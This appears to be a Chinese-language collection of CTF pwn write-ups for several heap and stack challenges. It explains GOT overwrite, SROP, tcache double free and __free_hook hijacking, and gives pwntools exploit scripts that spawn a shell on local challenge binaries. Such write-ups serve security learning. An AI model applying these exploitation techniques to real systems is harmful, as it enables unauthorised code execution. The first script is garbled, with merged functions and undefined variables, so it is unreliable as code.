程序一开始生成一个随机数，然后与我们的输入进行比较。我们可以让输入的首字节为\x00，因为strncmp遇到\x00会停止，这样v1=0，从而绕过strncmp。然后常规ROP就ok了。

#!/usr/bin/python2

from pwn import *

p = process('./babyheap')

def alloc(size):
    p.recvuntil('Command: ')
    p.sendline('1')

    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(len(content)))

    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvline()
    return p.recvline()

题目思路

先申请两个堆块，在申请一个较小的堆块存放/bin/sh

+-----+-------+-----+-------+-------+-------+
|text0|struct0|text1|struct1|/bin/sh|struct2|
+-----+-------+-----+-------+-------+-------+

然后释放掉0，在申请一块大小为size0+0x80的堆块

+-----+-------+-----+-------+-------+-------+-------+
|    text0    |text1|struct1|/bin/sh|struct2|struct0|
+-----+-------+-----+-------+-------+-------+-------+

这样我们就可以绕过update函数那个保护，修改struct1的desc指针为free@got，泄露libc，最后在free@got中写入system，delete(2)就相当于执行system('/bin/sh')

ciscn_s_3

分析程序

一开始看到这道题的时候一点思路都没有……后来看了wp，知道了还有一个叫SROP的技巧。我们可以看到程序执行了read(0,&buf,0x400)和write(1,&buf,0x30)。
所以可以通过read把/bin/sh写到栈中，然后可以通过write函数leak栈的地址。

然后的思路就是：

  1. 设置edi为/bin/sh的地址
  2. 设置rax为execve的调用号
  3. 造成系统中断，执行execve(“/bin/sh”)

至于怎么leak栈的地址，可以通过argv[0]。argv[0]是一个栈地址，指向的是程序的名称，也就是rsi的值。我们可以得到argv[0]的值，计算其与参数的偏移，从而得到参数的地址。
如我们输入字符串aaa：

ciscn_2019_final_3

最近在学 tcache，又学到了一题。

这个程序只有 add 和 remove 功能，add 会给你堆块数据域地址，存在UAF漏洞。

利用思路就是通过 double free 申请到已经申请过的堆块，这里注意要让此堆块地址 - 0x10，这样我们才可以修改它的 size；之后 free ，它会进入 unsorted bin（假设大小为 0x78）；之后我们 free 掉它后面的堆块（假设大小为 0x18），再申请一个 0x78 的堆块，fd 会转移到 下一个堆块的 fd，这样我们连续申请两个 0x18，就可以获得 libc_base，最后我是覆盖 free_hook 为 one_gadget 来 get shell。

from pwn import *

p = process('./ciscn_final_3')
elf = ELF('./ciscn_final_3')
libc = ELF('libc.so.6')

def add(idx,size,con):
    p.recvuntil(' > ')
    p.sendline('1')
    p.recvuntil('index')
    p.sendline(str(idx))
    p.recvuntil('size')
    p.sendline(str(size))
    p.recvuntil('something')
    p.send(con)
    p.recvuntil('0x')
    data = int(p.recvline(),16)
    return data

def remove(idx):
    p.recvuntil(' > ')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(idx))

def exp():
    addr = add(0,0x78,'a')

    add(1,0x18,'a')
    add(2,0x78,'a')
    add(3,0x78,'a')
    add(4,0x78,'a')
    add(5,0x78,'a')
    add(6,0x78,'a')
    add(7,0x78,'a')
    add(8,0x78,'a')
    add(9,0x78,'a')
    add(10,0x78,'a')
    add(11,0x78,'a')
    add(12,0x28,'a')

    remove(12)
    remove(12)
    add(13,0x28,p64(addr-0x10))
    add(14,0x28,p64(addr-0x10))
    add(15,0x28,p64(0)+p64(0x421))


    remove(0) #unsort_bin chunk0->fd=libc
    remove(1) #tcache

    add(16,0x78,'a')
    add(17,0x18,'a')

    libc_base = add(18,0x18,'a')-0x3ebca0
    p.info('libc_base: '+hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    one_gadget = libc_base + 0x4f322

    remove(2)
    remove(2)
    add(19,0x78,p64(free_hook))
    add(20,0x78,'/bin/sh')
    add(21,0x78,p64(one_gadget))
    remove(20)




if __name__ == '__main__':
    exp()
    #gdb.attach(p)
    p.interactive()

[ZJCTF 2019]EasyHeap

这道题是 wiki 讲解 unsortedbin attack 的原题，但buu复现时环境不同，无法通过 unsortedbin attack 拿到 flag。看了师傅们的 blog 可以有第二种打法（挺好理解的，但我 tcl 没想到 QAQ）。关键是在 0x6020ad 的地方可以变成我们的 fake chunk：

pwndbg> x/10gx 0x6020ad
0x6020ad:    0xfff7dd18e0000000    0x000000000000007f
0x6020bd:    0x0000000000000000    0x0000000000000000
0x6020cd:    0x0000000000000000    0x0000000000000000
0x6020dd:    0x0000000000000000    0x0000000000000000
0x6020ed <heaparray+13>:    0x0000000000000000    0x0000000000000000

这样我们获取这个 fake chunk 来覆盖 heaparray[0] 为 free_got，向里面写入 system_plt，再释放一个内容为 /bin/sh 的堆块来执行 system(‘/bin/sh’)。
